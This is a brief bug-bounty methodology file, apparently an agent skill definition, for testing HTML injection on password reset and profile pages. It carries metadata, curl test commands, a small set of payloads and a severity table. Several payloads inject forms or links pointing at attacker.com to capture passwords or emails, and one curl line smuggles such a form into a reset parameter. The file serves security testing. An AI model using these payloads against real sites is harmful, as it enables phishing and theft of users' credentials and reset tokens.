---
name: attack-html-injection
description: "HTML injection on password reset and other pages — inject forms and links to steal tokens or phish"
category: "client-side"
version: "1.0"
author: "bountyreper-official"
tags:
  - html-injection
  - xss
  - phishing
tech_stack:
  - web
cwe_ids:
  - CWE-79
  - CWE-80
chains_with:
  - wstg-clnt-01
  - attack-account-takeover
prerequisites: []
---

# HTML Injection

## Objective

Inject HTML via password reset and other reflected parameters to phish or steal tokens.

> **Attribution:** Methodology from [KathanP19/HowToHunt — HTML_Injection](https://github.com/KathanP19/HowToHunt/tree/master/HTML_Injection). Licensed GPL-3.0.

## Testing Methodology

```bash
# Password reset page HTML injection
curl "https://target.com/reset?email=<h1>test</h1>"
curl "https://target.com/reset?email=<form action=//attacker.com><input name=pass>"

# Test also: username, name, message params
curl "https://target.com/profile?name=<svg onload=alert(1)>"
```

Payloads:
```html
<h1>Injected</h1>
<form action="https://attacker.com/log"><input name="email"><input type="submit">
<a href="https://attacker.com">Click here to reset</a>
```

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| HTML injection leads to form hijack/phishing | High (P2) |
| Reflected HTML without sanitization | Medium (P3) |

## References

- [HowToHunt — HTML Injection](https://github.com/KathanP19/HowToHunt/tree/master/HTML_Injection)
